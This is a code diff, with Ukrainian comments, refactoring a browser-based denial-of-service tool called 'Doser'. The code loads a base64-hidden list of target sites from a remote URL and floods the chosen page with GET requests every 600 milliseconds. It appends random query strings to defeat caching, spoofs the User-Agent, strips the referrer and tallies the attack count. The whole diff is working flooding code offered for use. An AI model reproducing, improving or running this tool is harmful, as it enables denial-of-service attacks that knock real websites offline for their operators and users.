@@ -10,30 +10,35 @@
 /**
  * # Інструменти
  */
-class Tools {
+const Tools = {
 	/**
 	 * Генерація **GET** запиту
+	 * 
+	 * @param {Target} target
 	 * @returns {Promise<string>} **URL**
 	 */
-	async composeVictim() {
-		return !this.target.includes('?') ? this.target + `?q=${await getFloodString(64)}` : this.target
-	};
+	async composeVictim(target) {
+		let page = target.page;
+		return !page.includes('?') ? page + `?q=${await getFloodString(64)}` : page
+	},
 
 	/**
 	 * Зберігання данних про атаки
 	 */
 	addCount() {
-		this.attacks.text((+this.attacks.text()) + 1);
+		$("#attacks").text((+$("#attacks").text()) + 1);
 		++Database.attacks
-	};
+	},
  
 	/**
 	 * Показ цілі користувачу
+	 * 
+	 * @param {Target} target
 	 */
-	setTarget() {
-		this.targetField.text(this.target.page);
-		this.methodField.text("GET")
-	}
+	setTarget(target) {
+		$("#target").text(target.page);
+		$("#method").text("GET")
+	},
 
 	/**
 	 * Завантажувач цілей
@@ -43,8 +48,9 @@ class Tools {
 	async getTargets() {
 		// Завантаження цілей
 		// Кешування вимкнено
-		await fetch(this.targetSource, {cache:'no-cache'})
+		return await fetch(Doser.targetSource, {cache: 'no-cache'})
 			.then(async function(response) {
+				console.log(response)
 				const data = JSON.parse(atob(await response.text()));
 
 				/**@type Target[] */
@@ -65,9 +71,9 @@ class Tools {
 
 
 /**
- * ## Воркер
+ * # Воркер
  */
-class Doser extends Tools {
+class Doser {
 	/**
 	 * Конструктор досера
 	 * 
@@ -76,13 +82,9 @@ class Doser extends Tools {
 	 * @constructor
 	 */
 	constructor() {
-		super();
-		this.attacks = $("#attacks");
-		this.targetField = $("#target");
-		this.methodField = $("#method");
-		this.box = $("#box");
-		this.button = $("#button");
-		/**Інтервал для `fetch` атаки*/
+		/** Стан атаки */
+		this.attack = false
+		/** Інтервал для `fetch` атаки */
 		this.attackInterval = 600;
 		this.targetSource = atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h6eWFsbHpqeC0yMzEvaW91empsYS02MTIvbWFpbi80MC5qc29u');
 	};
@@ -95,77 +97,79 @@ class Doser extends Tools {
 	 * Запуск атаки
 	 */
     async start() {
-		this.attack = true; // Статус атаки
-		this.button.text("Стоп");
+		if (!this.attack) {
+			this.attack = true;
+			$("#button").text("Стоп");
 
-		// Створення сповіщення про завантаження цілей
-		// Тут теж буде рефакторинг
-		(l => {if (l[0]) l.remove()})($("#load"));
+			// Створення сповіщення про завантаження цілей
+			// Тут теж буде рефакторинг
+			(l => {if (l[0]) l.remove()})($("#load"));
 
-		// Завантаження цілей
+			// Завантаження цілей
 
-		$("<p>", {id: "load"})
-		.text("Завантажуємо цілі...")
-		.appendTo(this.box);
-
-
-        this.target = await this.getTargets();
-
-		console.log(this.target)
-
-		// Якщо цілі не завантажились
-        if (!this.target) {
-        	// Якщо не завнтажились цілі
-
-        	$("#load").text("Помилка завантаження!");
-    		swal("Помилка!",
-				 "Перевірте підключення до інтернету!",
-				 "error"
-			);
-
-        	this.attack = false;
-        	this.button.text("Старт!");
-        	return // Стоп
-        };
-
-		// Показ цілей
-		this.setTarget();
-        console.log(this.target);
+			$("<p>", {id: "load"})
+			.text("Завантажуємо цілі...")
+			.appendTo($("#box"));
 
 
-		// Видаємо юзерагент
-		const UserAgent = await getRandomUseragent();
-		console.log(UserAgent)
+			this.target = await Tools.getTargets();
 
-		// Старт атаки
+			console.log(this.target)
 
-		this.interval = 
-		setInterval(async () => {
-			await fetch(await this.composeVictim(), {
-				method: "GET",
-				mode: 'no-cors',
-				referrerPolicy: 'no-referrer',
-				headers: {
-					"User-Agent": UserAgent
-				},
-				cache: 'no-cache'
-			})
-			.then(this.addCount,
-				  this.addCount);
+			// Якщо цілі не завантажились
+			if (!this.target) {
+				// Якщо не завнтажились цілі
 
-        }, this.attackInterval);
+				$("#load").text("Помилка завантаження!");
+				swal("Помилка!",
+					"Перевірте підключення до інтернету!",
+					"error"
+				);
 
+				this.attack = false;
+				$("#button").text("Старт!");
+				return // Стоп
+			};
+
+			// Показ цілей
+			Tools.setTarget(this.target);
+			console.log(this.target);
+
+
+			// Видаємо юзерагент
+			const UserAgent = await getRandomUseragent();
+			console.log(UserAgent)
+
+			// Старт атаки
+
+			// TODO: ЗРОБИТИ РЕКУРСИВНИЙ TIMEOUT!
+			let attack = async () => {
+				await fetch(await Tools.composeVictim(this.target), {
+					method: "GET",
+					mode: 'no-cors',
+					referrerPolicy: 'no-referrer',
+					headers: {
+						"User-Agent": UserAgent
+					},
+					cache: 'no-cache'
+				})
+				.then(() => Tools.addCount(),
+					  () => Tools.addCount());
+
+			};
+
+			this.interval = setInterval(attack, this.attackInterval)
+		}
     };
 	/**
 	 * Зупинка атаки
 	 */
     stop() {
-    	if (this.interval) {
+    	if (this.interval && this.attack) {
 	    	this.attack = false;
-	    	this.lockAttackCount = true;
 	    	clearInterval(this.interval);
 	    	console.clear();
-	    	this.button.text("Старт!")
+	    	$("#button").text("Старт!")
     	}
     }
 }
